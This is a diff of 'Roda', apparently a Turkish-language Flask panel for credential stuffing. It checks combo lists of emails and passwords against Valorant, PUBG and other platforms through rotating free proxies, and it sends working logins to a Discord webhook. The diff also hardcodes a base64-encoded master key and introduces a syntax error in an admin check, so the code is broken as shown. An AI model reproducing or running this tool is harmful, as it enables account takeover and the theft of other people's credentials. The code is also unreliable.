@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Roda - API Discovery + Checker (Türkçe)
-IP Bazlı Key Sistemi | Valorant (Riot API) | PUBG | Duolingo | Ayrıştırma | Webhook
+IP Bazlı Key Sistemi | Valorant | Webhook (sadece HIT) | Ayrıştırma
 """
 
 import os, json, re, time, random, string, threading, webbrowser, base64
@@ -15,7 +15,7 @@ app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
 # ============================================================
-# MASTER KEY (BASE64 ile gizlenmiş)
+# MASTER KEY
 # ============================================================
 ENCODED_MASTER = "Um9kYUAyMDI2I1NlY3VyZSFYNw=="
 MASTER_KEY = base64.b64decode(ENCODED_MASTER).decode('utf-8')
@@ -56,7 +56,7 @@ def is_admin(key):
     return valid and role == "Admin"
 
 # ============================================================
-# PLATFORMLAR (Valorant doğru eklendi)
+# PLATFORMLAR
 # ============================================================
 PLATFORMS = [
     {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
@@ -81,9 +81,6 @@ PLATFORMS = [
     {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-crosshairs"},
 ]
 
-# ============================================================
-# KATEGORİZASYON (API Discovery için)
-# ============================================================
 def categorize_endpoint(endpoint):
     ep = endpoint.lower()
     if any(x in ep for x in ['login', 'auth', 'signin', 'signup', 'register', 'token', 'verify', 'validate', 'authenticate', 'session', 'logout', 'oauth', 'passport', 'authorize']):
@@ -99,9 +96,6 @@ def categorize_endpoint(endpoint):
     else:
         return 'Genel'
 
-# ============================================================
-# ENDPOINT ÇIKARICILAR (Aynı)
-# ============================================================
 def extract_from_html(html, base_url):
     endpoints = set()
     for m in re.finditer(r'action\s*=\s*["\']([^"\']+)["\']', html, re.I):
@@ -147,9 +141,6 @@ def extract_from_json(obj, base_url):
             endpoints.update(extract_from_json(item, base_url))
     return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]
 
-# ============================================================
-# PROXY FONKSİYONU
-# ============================================================
 def fetch_proxies():
     sources = [
         "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
@@ -170,9 +161,6 @@ def fetch_proxies():
             pass
     return list(proxies)
 
-# ============================================================
-# TARAMA MOTORU (API Discovery) - VALORANT EKLENDİ
-# ============================================================
 class APIScanner:
     def __init__(self, proxy_list=None):
         self.session = requests.Session()
@@ -301,7 +289,7 @@ class APIScanner:
             "/api/hesapcomtr", "/api/hesapcomtr/v1",
             "/api/itemsatis", "/api/itemsatis/v1",
             "/api/epinify", "/api/epinify/v1",
-            # VALORANT (Riot Games API) - DOĞRU EKLENDİ
+            # VALORANT (Riot Games API)
             "/authorize", "/authorize?redirect_uri=http%3A%2F%2Flocalhost%2Fredirect&client_id=riot-client&response_type=token%20id_token&nonce=1&scope=openid%20link%20ban%20account%20email%20mobile_number",
             "/api/token/v1",
             "/userinfo",
@@ -476,7 +464,7 @@ def admin_generate():
 def admin_delete():
     data = request.json
     key = data.get("master_key")
-    if not is_admin(key):
+    if not is_admin(key)):
         return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
     keys = load_keys()
     target = data.get("target_key", "")
@@ -532,7 +520,7 @@ def fetch_proxies_route():
         return jsonify({"success": False, "error": str(e)})
 
 # ============================================================
-# HTML (KISALTILMIŞ - ÖNEMLİ BÖLÜMLER)
+# HTML (Checker + API Keşif + Webhook)
 # ============================================================
 HTML_TEMPLATE = r"""
 <!DOCTYPE html>
@@ -617,10 +605,6 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#8a9bb0;cursor:pointer}
 .filters input[type=checkbox]{accent-color:var(--p);width:13px;height:13px}
 .results-container{flex:1;overflow-y:auto;border-radius:12px;background:rgba(0,0,0,0.25);border:1px solid var(--border)}
-.webhook-area{margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
-.webhook-area input{flex:1;min-width:150px;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:12px;outline:none}
-.webhook-area input:focus{border-color:var(--p)}
-.webhook-area button{padding:6px 16px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:12px}
 .setting-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)}
 .setting-row label{font-size:13px;font-weight:500}
 .setting-row .desc{font-size:10px;color:var(--muted)}
@@ -685,6 +669,10 @@ input:checked+.slider:before{transform:translateX(18px)}
 .stat-card-custom p{font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 .key-ip-input{width:200px;padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px;outline:none}
 .key-ip-input:focus{border-color:var(--p)}
+.webhook-area{margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.webhook-area input{flex:1;min-width:150px;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:12px;outline:none}
+.webhook-area input:focus{border-color:var(--p)}
+.webhook-area button{padding:6px 16px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:12px}
 ::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(255,107,0,0.2);border-radius:4px}
 </style>
 </head>
@@ -700,7 +688,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 <div id="sidebar">
-<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.2</div></div>
+<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.3</div></div>
 <div class="sidebar-nav">
 <div class="nav-divider">📁 MENÜ</div>
 <div class="nav-item active" data-page="checker" onclick="switchPage('checker')"><i class="fa-solid fa-check-double"></i> Checker</div>
@@ -733,7 +721,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div id="page-checker" class="page active">
 <div class="card">
 <h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın. <span style="color:var(--gold)">✅ HIT'ler otomatik webhook ile gönderilir!</span></p>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın.</p>
 <div class="checker-platform-select" id="checkerPlatformSelect"></div>
 <div class="checker-panel" id="checkerPanel">
 <div class="checker-top">
@@ -779,6 +767,17 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div class="hit-list" id="twofaList"><div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div></div>
 </div>
 </div>
+</div>
+<!-- WEBHOOK AYARLARI (Checker içinde) -->
+<div class="card">
+<h3><i class="fa-solid fa-link"></i> Webhook Ayarları</h3>
+<p style="font-size:12px;color:var(--muted);margin-bottom:8px">Sadece <span style="color:var(--g)">HIT</span> bulunduğunda Discord veya özel URL'ye gönderir.</p>
+<div class="webhook-area">
+<input id="webhookUrl" placeholder="Discord Webhook URL">
+<button onclick="saveWebhook()"><i class="fa-solid fa-floppy-disk"></i> Kaydet</button>
+<button onclick="testWebhook()"><i class="fa-solid fa-paper-plane"></i> Test</button>
+</div>
+<p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
 </div>
 </div>
 <!-- PROXY -->
@@ -827,10 +826,10 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div id="resultsList"></div>
 </div>
 <div class="webhook-area">
-<input id="webhookUrl" placeholder="Discord Webhook URL">
-<button onclick="saveWebhook()"><i class="fa-solid fa-floppy-disk"></i> Webhook Kaydet</button>
-<button onclick="testWebhook()"><i class="fa-solid fa-paper-plane"></i> Test</button>
-<p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
+<input id="webhookUrl2" placeholder="Discord Webhook URL">
+<button onclick="saveWebhook2()"><i class="fa-solid fa-floppy-disk"></i> Kaydet</button>
+<button onclick="testWebhook2()"><i class="fa-solid fa-paper-plane"></i> Test</button>
+<p id="webhookStatus2" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
 </div>
 </div>
 <!-- AYRIŞTIRMA (HERKESE AÇIK) -->
@@ -966,18 +965,26 @@ document.getElementById("authKey").addEventListener("keypress", function(e) {
 });
 
 // ============================================================
-// WEBHOOK FONKSİYONLARI (SADECE HIT İÇİN)
+// WEBHOOK FONKSİYONLARI
 // ============================================================
 function saveWebhook() {
     var url = document.getElementById("webhookUrl").value.trim();
     if (url) {
         localStorage.setItem("roda_webhook_url", url);
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi! (Sadece HIT gönderilir)</span>';
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi! (Sadece HIT)</span>';
+        // API Keşif'teki inputu da güncelle
+        var url2 = document.getElementById("webhookUrl2");
+        if (url2) url2.value = url;
+        document.getElementById("webhookStatus2").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi! (Sadece HIT)</span>';
     } else {
         localStorage.removeItem("roda_webhook_url");
         document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
+        if (document.getElementById("webhookStatus2")) {
+            document.getElementById("webhookStatus2").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
+        }
     }
 }
+function saveWebhook2() { saveWebhook(); }
 
 function getWebhookUrl() {
     return localStorage.getItem("roda_webhook_url") || "";
@@ -986,8 +993,14 @@ function getWebhookUrl() {
 function loadWebhookUrl() {
     var url = getWebhookUrl();
     if (url) {
-        document.getElementById("webhookUrl").value = url;
-        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi (Sadece HIT)</span>';
+        var inp = document.getElementById("webhookUrl");
+        if (inp) inp.value = url;
+        var inp2 = document.getElementById("webhookUrl2");
+        if (inp2) inp2.value = url;
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
+        if (document.getElementById("webhookStatus2")) {
+            document.getElementById("webhookStatus2").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
+        }
     }
 }
 
@@ -1003,7 +1016,7 @@ function sendCheckerWebhook(platform, email, password) {
 }
 
 function testWebhook() {
-    var url = document.getElementById("webhookUrl").value.trim();
+    var url = document.getElementById("webhookUrl").value.trim() || getWebhookUrl();
     if (!url) return alert("Webhook URL girin!");
     fetch(url, {
         method: "POST",
@@ -1021,6 +1034,7 @@ function testWebhook() {
         document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>';
     });
 }
+function testWebhook2() { testWebhook(); }
 
 // ============================================================
 // PLATFORM YÜKLEME
@@ -1130,7 +1144,7 @@ function renderHits() {
 }
 
 // ============================================================
-// İSTATİSTİK (HERKESE AÇIK)
+// İSTATİSTİK
 // ============================================================
 function updateStatsUI() {
     document.getElementById("sideTotal").innerText = foundEndpoints.length;
@@ -1350,7 +1364,7 @@ function loadParseFile() {
 }
 
 // ============================================================
-// SAYFA GEÇİŞİ (SABİT MENÜ)
+// SAYFA GEÇİŞİ
 // ============================================================
 function switchPage(page) {
     if ((page === "discovery" || page === "keys") && !isAdmin) {
@@ -1385,7 +1399,7 @@ function switchPage(page) {
 }
 
 // ============================================================
-// PROXY FONKSİYONLARI (HERKESE AÇIK)
+// PROXY FONKSİYONLARI
 // ============================================================
 function fetchProxies() {
     document.getElementById("proxyCount").innerText = "Çekiliyor...";
@@ -1410,7 +1424,7 @@ function toggleProxy() {
 }
 
 // ============================================================
-// ADMIN FONKSİYONLARI (SADECE ADMIN)
+// ADMIN FONKSİYONLARI
 // ============================================================
 function loadKeys() {
     if (!isAdmin) return;
@@ -1556,7 +1570,7 @@ function sendWebhook() {
         alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
         return;
     }
-    var url = document.getElementById("webhookUrl").value.trim();
+    var url = document.getElementById("webhookUrl").value.trim() || getWebhookUrl();
     if (!url) return alert("Webhook URL girin");
     var categories = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
     if (!categories.length) return alert("En az bir kategori seçin");
@@ -1589,7 +1603,7 @@ function exportJSON() {
 """
 
 # ============================================================
-# BAŞLAT (Render uyumlu)
+# BAŞLAT
 # ============================================================
 if __name__ == "__main__":
     if not os.path.exists(KEYS_FILE):
@@ -1604,9 +1618,8 @@ if __name__ == "__main__":
     ║     Render üzerinde çalışıyor                                  ║
     ║     🔒 IP Bazlı Key Sistemi Aktif                             ║
     ║     ✅ Valorant (Riot API) eklendi                           ║
-    ║     ✅ PUBG + Duolingo eklendi                               ║
+    ║     ✅ Webhook (sadece HIT) - Checker içinde de var          ║
     ║     Ayrıştırma ve istatistikler herkese açık                  ║
-    ║     Key'ler süresi boyunca kalıcı                             ║
     ╚══════════════════════════════════════════════════════════════════╝
     """)
 
